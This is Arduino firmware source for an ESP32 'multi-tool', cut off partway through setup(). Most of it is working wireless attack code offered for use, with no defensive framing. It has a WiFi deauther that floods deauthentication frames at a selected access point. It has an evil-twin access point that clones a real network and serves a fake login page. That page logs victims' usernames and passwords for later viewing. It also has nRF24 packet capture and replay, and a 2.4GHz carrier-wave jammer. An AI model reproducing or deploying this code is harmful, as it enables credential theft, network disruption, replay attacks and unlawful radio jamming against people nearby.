// =============================================================
// ESP32 MULTI-TOOL v2.3
// =============================================================
// BUTTON (GPIO0 built-in BOOT):
//   Single click  = scroll down / next / ch+
//   Double click  = primary action
//   Triple click  = secondary action (switch mode) OR exit (button mode)
//   Hold 700ms    = cycle modes on screen, release to enter
//                   (only works when all switches are OFF)
//
// SWITCHES (slide to active position = LOW):
//   D32 = BLE Scanner      D33 = WiFi Deauther
//   D34 = Evil Twin        D35 = nRF24 Capture
//   VP  = nRF24 Replay
//   Jammer = hold-button cycle only (no switch needed)
//
// BUTTON MAP PER MODE:
//   BLE      : 1=next  2=rescan     3=prev
//   Deauth   : 1=next  2=fire on/off  3=rescan
//   EvilTwin : 1=next SSID  2=launch/stop  3=creds on OLED
//   NRF Cap  : 1=ch+  2=ch-  3=clear buffer
//   NRF Replay: 1=next pkt  2=replay  3=clear
//   Jammer   : 1=ch+  2=sweep on/off  3=ch-
//
// EVIL TWIN CREDS:
//   http://192.168.4.1/creds (user:admin pass:CREDS_PASSWORD)
//   OR triple click while live → OLED viewer
//
// JAMMER NOTE:
//   Uses nRF24 continuous carrier wave. Jams nRF24 devices,
//   toy drones, RC cars, Zigbee, partially WiFi on same channel.
//   Cannot jam BLE (hops too fast) or do wideband jamming.
//   WiFi deauther handles WiFi disruption separately.
// =============================================================

#define CREDS_PASSWORD "changeme123"   // ← change before flashing

#include <Arduino.h>
#include <Wire.h>
#include <SPI.h>
#include <Adafruit_GFX.h>
#include <Adafruit_SSD1306.h>
#include <RF24.h>
#include <WiFi.h>
#include "esp_wifi.h"
#include <BLEDevice.h>
#include <BLEScan.h>
#include <BLEAdvertisedDevice.h>
#include <DNSServer.h>
#include <WebServer.h>
#include <SPIFFS.h>

// =============================================================
// PINS
// =============================================================
#define OLED_SDA   21
#define OLED_SCL   22
#define NRF_CE      5
#define NRF_CSN    17
#define LED_RED     2
#define LED_BLUE   25
#define LED_GREEN  26
#define LED_YELLOW 27
#define SW_BLE      32
#define SW_DEAUTH   33
#define SW_TWIN     34
#define SW_NRF_CAP  35
#define SW_NRF_REP  36
#define BOOT_BTN    0

#define SCREEN_W 128
#define SCREEN_H  64

Adafruit_SSD1306 display(SCREEN_W, SCREEN_H, &Wire, -1);
RF24 radio(NRF_CE, NRF_CSN);

enum AppMode {
  MODE_IDLE = 0,
  MODE_BLE_SCAN,
  MODE_DEAUTH,
  MODE_EVIL_TWIN,
  MODE_NRF_CAPTURE,
  MODE_NRF_REPLAY,
  MODE_JAMMER
};
AppMode currentMode = MODE_IDLE;

// =============================================================
// BUTTON STATE MACHINE
// single / double / triple click + hold detection
// =============================================================
enum BtnSM { BS_IDLE, BS_PRESSED, BS_WAIT_MORE, BS_HOLDING };
BtnSM        btnState  = BS_IDLE;
int          btnClicks = 0;
unsigned long btnT     = 0;

bool evtSingle = false, evtDouble = false, evtTriple = false;
bool evtHoldStart = false, evtHoldEnd = false;
bool isHolding = false;

const unsigned long HOLD_THRESH  = 700;
const unsigned long CLICK_WINDOW = 400;

void updateBoot() {
  evtSingle = evtDouble = evtTriple = evtHoldStart = evtHoldEnd = false;
  bool p = (digitalRead(BOOT_BTN) == LOW);
  unsigned long now = millis();
  switch (btnState) {
    case BS_IDLE:
      if (p) { btnState = BS_PRESSED; btnT = now; }
      break;
    case BS_PRESSED:
      if (!p) { btnClicks++; btnState = BS_WAIT_MORE; btnT = now; }
      else if (now - btnT >= HOLD_THRESH) {
        btnClicks = 0; btnState = BS_HOLDING; isHolding = true; evtHoldStart = true;
      }
      break;
    case BS_WAIT_MORE:
      if (p) { btnState = BS_PRESSED; btnT = now; }
      else if (now - btnT >= CLICK_WINDOW) {
        if      (btnClicks == 1) evtSingle = true;
        else if (btnClicks == 2) evtDouble = true;
        else                     evtTriple = true;
        btnClicks = 0; btnState = BS_IDLE;
      }
      break;
    case BS_HOLDING:
      if (!p) { isHolding = false; evtHoldEnd = true; btnState = BS_IDLE; }
      break;
  }
}

// =============================================================
// MODE CYCLING (hold, no switches active)
// =============================================================
const char* cycleLabels[] = { "BLE SCAN","DEAUTHER","EVIL TWIN","NRF CAP","NRF PLAY","JAMMER" };
AppMode     cycleModes[]  = { MODE_BLE_SCAN, MODE_DEAUTH, MODE_EVIL_TWIN,
                               MODE_NRF_CAPTURE, MODE_NRF_REPLAY, MODE_JAMMER };
const int   NUM_CYCLE     = 6;
int         holdCycleIdx  = 0;
unsigned long holdCycleLast = 0;

AppMode getSwitchMode() {
  if (digitalRead(SW_BLE)     == LOW) return MODE_BLE_SCAN;
  if (digitalRead(SW_DEAUTH)  == LOW) return MODE_DEAUTH;
  if (digitalRead(SW_TWIN)    == LOW) return MODE_EVIL_TWIN;
  if (digitalRead(SW_NRF_CAP) == LOW) return MODE_NRF_CAPTURE;
  if (digitalRead(SW_NRF_REP) == LOW) return MODE_NRF_REPLAY;
  return MODE_IDLE;
}
bool switchActive() { return getSwitchMode() != MODE_IDLE; }

void drawHoldOverlay() {
  display.fillRect(12, 21, 104, 22, SSD1306_BLACK);
  display.drawRect(12, 21, 104, 22, SSD1306_WHITE);
  display.setTextColor(SSD1306_WHITE);
  display.setCursor(16, 27); display.setTextSize(1);
  display.printf("< %-9s >", cycleLabels[holdCycleIdx]);
  display.display();
}

// =============================================================
// OLED HELPERS
// =============================================================
void oledClear() { display.clearDisplay(); display.setTextSize(1); display.setTextColor(SSD1306_WHITE); }
void oledHeader(const char* t) {
  display.fillRect(0,0,SCREEN_W,11,SSD1306_WHITE);
  display.setTextColor(SSD1306_BLACK); display.setCursor(2,2); display.print(t);
  display.setTextColor(SSD1306_WHITE);
}
void oledFooter(const char* t) { display.setCursor(0,57); display.setTextSize(1); display.print(t); }
void ledsOff() { digitalWrite(LED_RED,LOW); digitalWrite(LED_BLUE,LOW); digitalWrite(LED_GREEN,LOW); digitalWrite(LED_YELLOW,LOW); }

// =============================================================
// IDLE — shows live switch states
// =============================================================
void drawIdle() {
  oledClear();
  display.setCursor(22,0); display.print("[ MULTI-TOOL ]");
  const char* lbl[] = { "BLE","DAUTH","TWIN","CAP","REP" };
  const int   pins[]= { SW_BLE, SW_DEAUTH, SW_TWIN, SW_NRF_CAP, SW_NRF_REP };
  for (int i = 0; i < 5; i++) {
    int col = (i%3)*43, row = 12+(i/3)*18;
    bool on = (digitalRead(pins[i]) == LOW);
    display.setCursor(col,row); display.printf("%-5s",lbl[i]);
    display.setCursor(col,row+9);
    if (on) {
      display.fillRect(col,row+8,36,9,SSD1306_WHITE);
      display.setTextColor(SSD1306_BLACK);
      display.setCursor(col+4,row+9); display.print(" ON ");
      display.setTextColor(SSD1306_WHITE);
    } else { display.print(" off"); }
  }
  display.setCursor(0,50); display.print("hold btn to pick mode");
  display.display();
}

// =============================================================
// BLE SCANNER
// 1=scroll next  2=rescan  3=scroll prev
// =============================================================
struct BLEEntry { char mac[18]; char type[8]; int rssi; };
#define MAX_BLE 30
BLEEntry bleList[MAX_BLE];
int bleCount=0, bleScroll=0;
bool bleScanning=false;
BLEScan* bleScan=nullptr;

class MyBLECB : public BLEAdvertisedDeviceCallbacks {
  void onResult(BLEAdvertisedDevice dev) {
    const char* mac = dev.getAddress().toString().c_str();
    for (int i=0;i<bleCount;i++) {
      if (strcmp(bleList[i].mac,mac)==0) { bleList[i].rssi=dev.getRSSI(); return; }
    }
    if (bleCount >= MAX_BLE) return;
    BLEEntry& e = bleList[bleCount];
    strncpy(e.mac,mac,17); e.mac[17]=0;
    e.rssi=dev.getRSSI(); strcpy(e.type,"GEN");
    if (dev.haveManufacturerData()) {
      String mfr = dev.getManufacturerData();
      if (mfr.length()>=2) {
        if ((uint8_t)mfr[0]==0x4C&&(uint8_t)mfr[1]==0x00) strcpy(e.type,"APPLE");
        if ((uint8_t)mfr[0]==0x07&&(uint8_t)mfr[1]==0x01) strcpy(e.type,"TILE");
      }
    }
    if (dev.haveServiceUUID()) {
      String uuid = dev.getServiceUUID().toString();
      if (uuid=="00001812-0000-1000-8000-00805f9b34fb") strcpy(e.type,"HID");
    }
    bleCount++;
    if (strcmp(e.type,"APPLE")==0) digitalWrite(LED_RED,HIGH);
    if (strcmp(e.type,"HID")==0)   digitalWrite(LED_BLUE,HIGH);
    if (e.rssi>-50)                digitalWrite(LED_YELLOW,HIGH);
  }
};

void setupBLE() {
  BLEDevice::init("");
  bleScan=BLEDevice::getScan();
  bleScan->setAdvertisedDeviceCallbacks(new MyBLECB(),true);
  bleScan->setActiveScan(true); bleScan->setInterval(100); bleScan->setWindow(99);
}

void bleStartScan() {
  ledsOff(); bleCount=0; bleScroll=0; bleScanning=true;
  bleScan->start(5,[](BLEScanResults){bleScanning=false;},false);
}

void drawBLE() {
  oledClear();
  char hdr[22]; snprintf(hdr,22,"BLE [%d]%s",bleCount,bleScanning?" ...":"");
  oledHeader(hdr);
  if (bleCount==0) {
    display.setCursor(8,22); display.print(bleScanning?"Scanning...":"No devices found.");
    display.setCursor(8,36); display.print("Dbl click to rescan.");
  } else {
    for (int i=0;i<3;i++) {
      int idx=(bleScroll+i)%bleCount;
      display.setCursor(0,13+i*17);
      display.printf("%s%-5s %4ddBm", i==0?">":" ", bleList[idx].type, bleList[idx].rssi);
      display.setCursor(6,13+i*17+8); display.print(bleList[idx].mac);
    }
    char nav[22]; snprintf(nav,22,"%d/%d",bleScroll+1,bleCount);
    display.setCursor(100,57); display.print(nav);
  }
  oledFooter("1:dn 2:scan 3:up");
  display.display();
}

void handleBLE() {
  if (evtSingle && bleCount>0) bleScroll=(bleScroll+1)%bleCount;
  if (evtTriple && bleCount>0) bleScroll=(bleScroll-1+bleCount)%bleCount;
  if (evtDouble && !bleScanning) bleStartScan();
  drawBLE();
}

// =============================================================
// WIFI DEAUTHER — async scan
// 1=next AP  2=toggle fire  3=rescan
// =============================================================
struct APEntry { char ssid[33]; uint8_t bssid[6]; int32_t rssi; uint8_t channel; };
#define MAX_APS 20
APEntry apList[MAX_APS];
int  apCount=0, apSelected=0;
bool deauthing=false, wifiReady=false, wifiScanning=false;

uint8_t deauthFrame[26]={
  0xC0,0x00,0x00,0x00,
  0xFF,0xFF,0xFF,0xFF,0xFF,0xFF,
  0x00,0x00,0x00,0x00,0x00,0x00,
  0x00,0x00,0x00,0x00,0x00,0x00,
  0x00,0x00,0x07,0x00
};

void initWifi() {
  if (wifiReady) return;
  wifi_init_config_t cfg=WIFI_INIT_CONFIG_DEFAULT();
  esp_wifi_init(&cfg); esp_wifi_set_storage(WIFI_STORAGE_RAM);
  esp_wifi_set_mode(WIFI_MODE_APSTA); esp_wifi_start();
  wifiReady=true;
}

void startWifiScanAsync() {
  WiFi.mode(WIFI_STA); WiFi.scanNetworks(true,true);
  wifiScanning=true; apCount=0;
}

void pollWifiScan() {
  if (!wifiScanning) return;
  int n=WiFi.scanComplete();
  if (n==WIFI_SCAN_RUNNING) return;
  if (n>0) {
    apCount=min(n,MAX_APS);
    for (int i=0;i<apCount;i++) {
      strlcpy(apList[i].ssid,WiFi.SSID(i).c_str(),33);
      apList[i].rssi=WiFi.RSSI(i); apList[i].channel=WiFi.channel(i);
      memcpy(apList[i].bssid,WiFi.BSSID(i),6);
    }
    WiFi.scanDelete();
  }
  esp_wifi_set_mode(WIFI_MODE_APSTA); wifiScanning=false;
}

void sendDeauth(int idx) {
  uint8_t* b=apList[idx].bssid;
  memcpy(&deauthFrame[10],b,6); memcpy(&deauthFrame[16],b,6);
  esp_wifi_set_channel(apList[idx].channel,WIFI_SECOND_CHAN_NONE);
  for (int i=0;i<10;i++) { esp_wifi_80211_tx(WIFI_IF_AP,deauthFrame,sizeof(deauthFrame),false); delayMicroseconds(200); }
}

void drawDeauth() {
  oledClear();
  oledHeader(deauthing?"DEAUTH [FIRING]":(wifiScanning?"DEAUTH [SCAN...]":"DEAUTH"));
  if (apCount==0) {
    display.setCursor(0,22); display.print(wifiScanning?"Scanning APs...":"No APs found.");
    display.setCursor(0,34); display.print("Triple click to rescan.");
  } else {
    for (int i=0;i<3&&i<apCount;i++) {
      int idx=(apSelected+i)%apCount;
      display.setCursor(0,13+i*16);
      display.printf("%s%.15s",i==0?">":" ",apList[idx].ssid);
      display.setCursor(6,13+i*16+8);
      display.printf("ch%d %ddBm %s",apList[idx].channel,apList[idx].rssi,idx==apSelected&&deauthing?"[FIRE]":"");
    }
    char nav[12]; snprintf(nav,12,"%d/%d",apSelected+1,apCount);
    display.setCursor(100,57); display.print(nav);
  }
  oledFooter("1:next 2:fire 3:scan");
  display.display();
}

void handleDeauth() {
  pollWifiScan();
  if (evtSingle&&apCount>0) { deauthing=false; digitalWrite(LED_RED,LOW); apSelected=(apSelected+1)%apCount; }
  if (evtDouble&&apCount>0) { deauthing=!deauthing; digitalWrite(LED_RED,deauthing); }
  if (evtTriple) { deauthing=false; digitalWrite(LED_RED,LOW); startWifiScanAsync(); }
  if (deauthing&&apCount>0) { sendDeauth(apSelected); digitalWrite(LED_RED,!digitalRead(LED_RED)); }
  drawDeauth();
}

// =============================================================
// EVIL TWIN
// 1=next SSID  2=launch/stop  3=creds viewer (when live)
// Clones SSID + BSSID + channel of target AP
// Creds: http://192.168.4.1/creds  OR triple click → OLED
// =============================================================
DNSServer  dnsServer;
WebServer  httpServer(80);
bool       twinActive=false;
int        credCount=0, twinScroll=0;
char       twinSSID[33]="Free_WiFi";
uint8_t    twinBSSID[6]={0xDE,0xAD,0xBE,0xEF,0x00,0x01};
uint8_t    twinChannel=6;
IPAddress  apIP(192,168,4,1);

bool twinCredsView=false;
#define MAX_CRED_LINES 15
char credLines[MAX_CRED_LINES][52];
int  credLineCount=0, credLineScroll=0;

void loadCredsOLED() {
  credLineCount=0; credLineScroll=0;
  File f=SPIFFS.open("/creds.txt",FILE_READ);
  if (!f) return;
  while (f.available()&&credLineCount<MAX_CRED_LINES) {
    String ln=f.readStringUntil('\n'); ln.trim();
    if (ln.length()>0) strlcpy(credLines[credLineCount++],ln.c_str(),51);
  }
  f.close();
}

const char* portalHTML=R"html(<!DOCTYPE html><html><head>
<meta name='viewport' content='width=device-width,initial-scale=1'>
<title>Sign In</title>
<style>body{font-family:sans-serif;max-width:380px;margin:50px auto;padding:20px}
input{width:100%;padding:10px;margin:6px 0;box-sizing:border-box;font-size:16px}
button{width:100%;padding:12px;background:#0066CC;color:#fff;border:none;font-size:16px}
</style></head><body>
<h2>Network Login</h2><p>Sign in to access the internet.</p>
<form method='POST' action='/login'>
<input name='u' placeholder='Email or Username' required>
<input name='p' type='password' placeholder='Password' required>
<button>Connect</button></form></body></html>)html";

void startTwin(const char* ssid, uint8_t* bssid, uint8_t channel) {
  initWifi();
  esp_wifi_stop();
  if (bssid) esp_wifi_set_mac(WIFI_IF_AP,bssid);
  esp_wifi_set_mode(WIFI_MODE_AP);
  esp_wifi_start();
  WiFi.softAPConfig(apIP,apIP,IPAddress(255,255,255,0));
  WiFi.softAP(ssid,"",channel,0,4);
  dnsServer.start(53,"*",apIP);
  httpServer.on("/",HTTP_GET,[]{httpServer.send(200,"text/html",portalHTML);});
  httpServer.on("/login",HTTP_POST,[]{
    String u=httpServer.arg("u"),p=httpServer.arg("p");
    File f=SPIFFS.open("/creds.txt",FILE_APPEND);
    if (f){f.printf("[%lus] %s : %s\n",millis()/1000,u.c_str(),p.c_str());f.close();}
    credCount++; digitalWrite(LED_GREEN,HIGH);
    httpServer.sendHeader("Location","https://www.google.com"); httpServer.send(302);
  });
  httpServer.on("/creds",HTTP_GET,[]{
    if (!httpServer.authenticate("admin",CREDS_PASSWORD))
      return httpServer.requestAuthentication(BASIC_AUTH,"Multi-Tool","Denied.");
    File f=SPIFFS.open("/creds.txt",FILE_READ);
    if (!f||f.size()==0){httpServer.send(200,"text/plain","No creds yet.");return;}
    String out="<!DOCTYPE html><html><head><meta name='viewport' content='width=device-width,initial-scale=1'>"
               "<style>body{font-family:monospace;padding:15px}pre{background:#111;color:#0f0;padding:12px;border-radius:6px}</style>"
               "</head><body><h3>Captured Credentials</h3><pre>";
    while(f.available()) out+=(char)f.read();
    f.close(); out+="</pre><a href='/creds/clear'>[Clear all]</a></body></html>";
    httpServer.send(200,"text/html",out);
  });
  httpServer.on("/creds/clear",HTTP_GET,[]{
    if (!httpServer.authenticate("admin",CREDS_PASSWORD))
      return httpServer.requestAuthentication(BASIC_AUTH,"Multi-Tool","Denied.");
    SPIFFS.remove("/creds.txt"); credCount=0;
    httpServer.send(200,"text/plain","Cleared.");
  });
  httpServer.onNotFound([]{httpServer.sendHeader("Location","http://"+apIP.toString());httpServer.send(302);});
  httpServer.begin();
  twinActive=true;
}

void stopTwin() { httpServer.stop(); dnsServer.stop(); WiFi.softAPdisconnect(true); twinActive=false; }

void drawEvilTwin() {
  oledClear();
  if (twinCredsView) {
    char hdr[22]; snprintf(hdr,22,"CREDS [%d]",credLineCount);
    oledHeader(hdr);
    if (credLineCount==0) {
      display.setCursor(0,25); display.print("No creds captured yet.");
      display.setCursor(0,37); display.print("Wait for victims.");
    } else {
      String ln=credLines[credLineScroll%credLineCount];
      int sep=ln.indexOf(" : ");
      int ts=ln.indexOf("] ");
      display.setCursor(0,14); display.print("USER:");
      display.setCursor(0,24);
      String user = (ts>=0&&sep>ts) ? ln.substring(ts+2,sep) : ln.substring(0,sep>0?sep:ln.length());
      display.print(user.length()>20 ? user.substring(0,20) : user);
      display.setCursor(0,37); display.print("PASS:");
      display.setCursor(0,47);
      String pass = sep>=0 ? ln.substring(sep+3) : "?";
      display.print(pass.length()>20 ? pass.substring(0,20) : pass);
      char nav[12]; snprintf(nav,12,"%d/%d",credLineScroll+1,credLineCount);
      display.setCursor(100,57); display.print(nav);
    }
    oledFooter("1:next  2:back");
  } else {
    oledHeader(twinActive?"EVIL TWIN [LIVE]":"EVIL TWIN");
    if (!twinActive) {
      display.setCursor(0,13); display.print("Clone target SSID:");
      display.setCursor(0,23);
      if (apCount>0) {
        int idx=twinScroll%apCount;
        display.printf("> %.16s",apList[idx].ssid);
        display.setCursor(0,33);
        display.printf("  ch%d  %02X:%02X:%02X...",
          apList[idx].channel,apList[idx].bssid[0],apList[idx].bssid[1],apList[idx].bssid[2]);
        char nav[12]; snprintf(nav,12,"%d/%d",(twinScroll%apCount)+1,apCount);
        display.setCursor(100,33); display.print(nav);
      } else { display.print("> Free_WiFi (no scan)"); }
      display.setCursor(0,46); display.print("1:next  2:launch");
    } else {
      display.setCursor(0,13); display.printf("SSID: %.18s",twinSSID);
      display.setCursor(0,24); display.printf("ch:%d  192.168.4.1",twinChannel);
      display.setCursor(0,35); display.printf("Creds: %d captured",credCount);
      display.setCursor(0,46); display.print("2:stop  3:view creds");
    }
  }
  display.display();
}

void handleEvilTwin() {
  if (twinCredsView) {
    if (evtSingle) credLineScroll=(credLineScroll+1)%max(credLineCount,1);
    if (evtDouble||evtTriple) twinCredsView=false;
  } else {
    if (!twinActive) {
      if (evtSingle&&apCount>0) twinScroll=(twinScroll+1)%apCount;
      if (evtDouble) {
        if (apCount>0) {
          int idx=twinScroll%apCount;
          strlcpy(twinSSID,apList[idx].ssid,33);
          memcpy(twinBSSID,apList[idx].bssid,6);
          twinChannel=apList[idx].channel;
          SPIFFS.begin(true); startTwin(twinSSID,twinBSSID,twinChannel);
        } else {
          SPIFFS.begin(true); startTwin(twinSSID,nullptr,twinChannel);
        }
      }
    } else {
      dnsServer.processNextRequest(); httpServer.handleClient();
      if (evtDouble) stopTwin();
      if (evtTriple) { loadCredsOLED(); twinCredsView=true; }
    }
  }
  drawEvilTwin();
}

// =============================================================
// nRF24 CAPTURE
// 1=ch+  2=ch-  3=clear buffer
// =============================================================
#define MAX_PKTS 10
uint8_t nrfPkts[MAX_PKTS][32];
int  nrfCount=0, nrfScroll=0;
uint8_t nrfChan=2;
bool nrfCapOn=false, nrfReady=false;
const uint64_t PROMISC_ADDR=0xAAAAAAAAAALL;

void setupNRF() {
  if (!radio.begin()) return;
  radio.setPALevel(RF24_PA_MAX); radio.setDataRate(RF24_2MBPS);
  radio.setAutoAck(false); radio.disableCRC(); radio.setPayloadSize(32);
  nrfReady=true;
}

void nrfStartCap() {
  radio.setChannel(nrfChan); radio.setAddressWidth(2);
  radio.openReadingPipe(1,PROMISC_ADDR); radio.startListening();
  nrfCapOn=true; digitalWrite(LED_BLUE,HIGH);
}
void nrfStopCap() { radio.stopListening(); nrfCapOn=false; digitalWrite(LED_BLUE,LOW); }

void nrfPoll() {
  if (!nrfCapOn||nrfCount>=MAX_PKTS) return;
  if (radio.available()) {
    radio.read(nrfPkts[nrfCount++],32);
    digitalWrite(LED_YELLOW,HIGH); delay(40); digitalWrite(LED_YELLOW,LOW);
  }
}

void drawNRFCap() {
  oledClear();
  oledHeader(nrfCapOn?"nRF24 CAP [ON]":"nRF24 CAP [OFF]");
  display.setCursor(0,13); display.printf("Ch:%3d  Pkts: %d/%d",nrfChan,nrfCount,MAX_PKTS);
  // WiFi channel reference (nRF ch ≈ 2400+ch MHz, WiFi ch1=2412)
  int wifiCh=(nrfChan>=12)?(nrfChan-12)/5+1:-1;
  if (wifiCh>=1&&wifiCh<=13) { display.setCursor(0,22); display.printf("~WiFi ch%d",wifiCh); }
  if (nrfCount>0) {
    display.setCursor(0,30); display.print("Last:");
    display.setCursor(0,39); for(int i=0;i<8;i++) display.printf("%02X ",nrfPkts[nrfCount-1][i]);
    display.setCursor(0,49); for(int i=8;i<16;i++) display.printf("%02X ",nrfPkts[nrfCount-1][i]);
  } else { display.setCursor(0,35); display.print("Listening for packets..."); }
  oledFooter("1:ch+ 2:ch- 3:clear");
  display.display();
}

void handleNRFCapture() {
  if (!nrfReady) {
    oledClear(); oledHeader("nRF24 CAP");
    display.setCursor(0,25); display.print("nRF24 not found!");
    display.setCursor(0,37); display.print("Check wiring.");
    display.display(); return;
  }
  if (evtSingle) { nrfChan=nrfChan>=125?0:nrfChan+1; if(nrfCapOn){nrfStopCap();nrfStartCap();} }
  if (evtDouble) { nrfChan=nrfChan==0?125:nrfChan-1; if(nrfCapOn){nrfStopCap();nrfStartCap();} }
  if (evtTriple) { nrfCount=0; nrfScroll=0; }
  nrfPoll();
  drawNRFCap();
}

// =============================================================
// nRF24 REPLAY
// 1=next pkt  2=replay  3=clear buffer
// =============================================================
void nrfReplay(int idx) {
  radio.stopListening(); radio.setAddressWidth(5);
  radio.openWritingPipe(PROMISC_ADDR); radio.setChannel(nrfChan);
  for (int i=0;i<5;i++) { radio.write(nrfPkts[idx],32); delay(8); }
  if (nrfCapOn) radio.startListening();
  digitalWrite(LED_RED,HIGH); delay(100); digitalWrite(LED_RED,LOW);
}

void drawNRFReplay() {
  oledClear(); oledHeader("nRF24 REPLAY");
  display.setCursor(0,13); display.printf("Ch:%3d  Pkts: %d",nrfChan,nrfCount);
  if (nrfCount==0) {
    display.setCursor(0,28); display.print("No packets captured.");
    display.setCursor(0,40); display.print("Use CAP mode first.");
  } else {
    int idx=nrfScroll%nrfCount;
    display.setCursor(0,24); display.printf("Pkt %d/%d:",idx+1,nrfCount);
    display.setCursor(0,34); for(int i=0;i<8;i++) display.printf("%02X ",nrfPkts[idx][i]);
    display.setCursor(0,44); for(int i=8;i<16;i++) display.printf("%02X ",nrfPkts[idx][i]);
  }
  oledFooter("1:next 2:REPLAY 3:clr");
  display.display();
}

void handleNRFReplay() {
  if (evtSingle&&nrfCount>0) nrfScroll=(nrfScroll+1)%nrfCount;
  if (evtDouble&&nrfCount>0) nrfReplay(nrfScroll%nrfCount);
  if (evtTriple) { nrfCount=0; nrfScroll=0; }
  drawNRFReplay();
}

// =============================================================
// nRF24 JAMMER
// Broadcasts continuous carrier wave on a 2.4GHz channel.
// Targets: nRF24 devices, RC toys, Zigbee, partially WiFi.
// Does NOT jam BLE (hops too fast) or do wideband jamming.
//
// 1=ch+  2=toggle sweep mode  3=ch-
// Sweep: rapidly hops channels for broader interference.
// Fixed: jams single channel at max power.
// =============================================================
bool     jamActive  = false;
bool     jamSweep   = false;
uint8_t  jamChan    = 40;   // default ch40 ≈ 2440MHz (WiFi ch8 overlap)
unsigned long jamSweepLast = 0;
uint8_t  jamSweepChan = 0;

// WiFi channel 1-13 maps to nRF24 channels:
// WiFi ch N centre = 2407 + 5*N MHz → nRF24 ch = (WiFi_MHz - 2400)
// e.g. WiFi ch1=2412MHz → nRF24 ch12
// Sweep range covers nRF24 ch1..125 (2401..2525 MHz)
// WiFi 2.4GHz sits in ch1..83

void jamStart() {
  if (!nrfReady) return;
  nrfStopCap(); // make sure cap mode is off
  radio.stopListening();
  radio.startConstCarrier(RF24_PA_MAX, jamChan);
  jamActive=true;
  digitalWrite(LED_RED,HIGH);
}

void jamStop() {
  if (!nrfReady) return;
  radio.stopConstCarrier();
  // re-init radio for normal use
  radio.begin();
  radio.setPALevel(RF24_PA_MAX); radio.setDataRate(RF24_2MBPS);
  radio.setAutoAck(false); radio.disableCRC(); radio.setPayloadSize(32);
  jamActive=false; jamSweep=false;
  ledsOff();
}

void jamPoll() {
  if (!jamActive||!jamSweep) return;
  if (millis()-jamSweepLast>=2) { // hop every 2ms
    jamSweepChan=(jamSweepChan+1)%126;
    radio.stopConstCarrier();
    radio.startConstCarrier(RF24_PA_MAX,jamSweepChan);
    jamSweepLast=millis();
    // blink yellow to show activity
    digitalWrite(LED_YELLOW,(jamSweepChan%8)==0);
  }
}

void drawJammer() {
  oledClear();
  char hdr[22];
  if (!jamActive)    snprintf(hdr,22,"JAMMER [OFF]");
  else if (jamSweep) snprintf(hdr,22,"JAMMER [SWEEP]");
  else               snprintf(hdr,22,"JAMMER [FIXED ch%d]",jamChan);
  oledHeader(hdr);

  display.setCursor(0,13);
  if (!jamActive) {
    display.printf("Channel: %3d",jamChan);
    // show what this channel hits
    int wc=(jamChan>=12)?(jamChan-12)/5+1:-1;
    display.setCursor(0,23);
    if (wc>=1&&wc<=13) display.printf("~WiFi ch%d / 2.4GHz",wc);
    else               display.printf("2.4GHz band (%dMHz)",2400+jamChan);
    display.setCursor(0,35); display.print("Targets: nRF24, RC,");
    display.setCursor(0,45); display.print("Zigbee, partial WiFi");
    display.setCursor(0,50); // overwrite footer area
  } else if (jamSweep) {
    display.printf("Sweeping ch 0-125");
    display.setCursor(0,23); display.printf("Current: ch%3d",jamSweepChan);
    display.setCursor(0,33); display.printf("Freq: %dMHz",2400+jamSweepChan);
    display.setCursor(0,43); display.print("Broad interference!");
    digitalWrite(LED_RED,HIGH);
  } else {
    display.printf("Fixed ch%3d  (%dMHz)",jamChan,2400+jamChan);
    int wc=(jamChan>=12)?(jamChan-12)/5+1:-1;
    display.setCursor(0,23);
    if (wc>=1&&wc<=13) display.printf("Jamming WiFi ch%d area",wc);
    else               display.printf("Jamming 2.4GHz band");
    display.setCursor(0,35); display.print("TX at MAX power");
    display.setCursor(0,45); display.print("[ACTIVE]");
    digitalWrite(LED_RED,!digitalRead(LED_RED)); // blink
  }
  oledFooter("1:ch+ 2:sweep 3:ch-");
  display.display();
}

void handleJammer() {
  if (!nrfReady) {
    oledClear(); oledHeader("JAMMER");
    display.setCursor(0,25); display.print("nRF24 not found!");
    display.setCursor(0,37); display.print("Check wiring.");
    display.display(); return;
  }

  if (evtSingle) {
    jamChan=jamChan>=125?0:jamChan+1;
    if (jamActive&&!jamSweep) { radio.stopConstCarrier(); radio.startConstCarrier(RF24_PA_MAX,jamChan); }
  }
  if (evtTriple) {
    jamChan=jamChan==0?125:jamChan-1;
    if (jamActive&&!jamSweep) { radio.stopConstCarrier(); radio.startConstCarrier(RF24_PA_MAX,jamChan); }
  }
  if (evtDouble) {
    if (!jamActive) {
      jamSweep=false; jamStart();      // first double: start fixed
    } else if (!jamSweep) {
      jamSweep=true; jamSweepChan=0;  // second double: enable sweep
      jamSweepLast=millis();
    } else {
      jamStop();                        // third double: stop everything
    }
  }

  jamPoll();
  drawJammer();
}

// =============================================================
// MODE TRANSITIONS
// =============================================================
void onModeEnter(AppMode mode) {
  ledsOff(); twinCredsView=false;
  // Always stop jammer when leaving jammer mode
  if (jamActive) jamStop();
  switch (mode) {
    case MODE_IDLE:
      if (twinActive) stopTwin();
      if (nrfCapOn)   nrfStopCap();
      deauthing=false; drawIdle(); break;
    case MODE_BLE_SCAN:    bleStartScan(); break;
    case MODE_DEAUTH:      initWifi(); apSelected=0; deauthing=false; startWifiScanAsync(); break;
    case MODE_EVIL_TWIN:   credCount=0; twinScroll=0; SPIFFS.begin(true); break;
    case MODE_NRF_CAPTURE: if(nrfReady){nrfCount=0;nrfScroll=0;nrfStartCap();} break;
    case MODE_NRF_REPLAY:  nrfScroll=0; break;
    case MODE_JAMMER:      jamChan=40; jamSweep=false; jamActive=false; break;
  }
}

// =============================================================
// SETUP & LOOP
// =============================================================
void setup() {
  Serial.begin(115200);
  pinMode(LED_RED,OUTPUT); pinMode(LED_BLUE,OUTPUT);
  pinMode(LED_GREEN,OUTPUT); pinMode(LED_YELLOW,OUTPUT);
  pinMode(SW_BLE,INPUT_PULLUP); pinMode(SW_DEAUTH,INPUT_PULLUP);
  // SW_TWIN(34)/SW_NRF_CAP(35)/SW_NRF_REP(36): input-only — right pin → 3.3V
  pinMode(BOOT_BTN,INPUT_PULLUP);

  Wire.begin(OLED_SDA,OLED_SCL);
  if (!display.begin(SSD1306_SWITCHCAPVCC,0x3C)) { Serial.println("OLED fail"); while(1); }

  display.clearDisplay(); display.setTextSize(2); display.setTextColor(SSD1306_WHITE);
  display.setCursor(18,8);  display.print("MULTI");
  display.setCursor(14,28); display.print("-TOOL-");
  display.setTextSize(1);
  display.setCursor(20,50); display.print("v2.3  ESP32+nRF24");
  display.display();

  for (int i=0;i<3;i++) {
    for (int p:{LED_RED,LED_BLUE,LED_GREEN,LED_YELLOW}) { digitalWrite(p,HIGH); delay(70); digitalWrite(p,LOW); }
  }

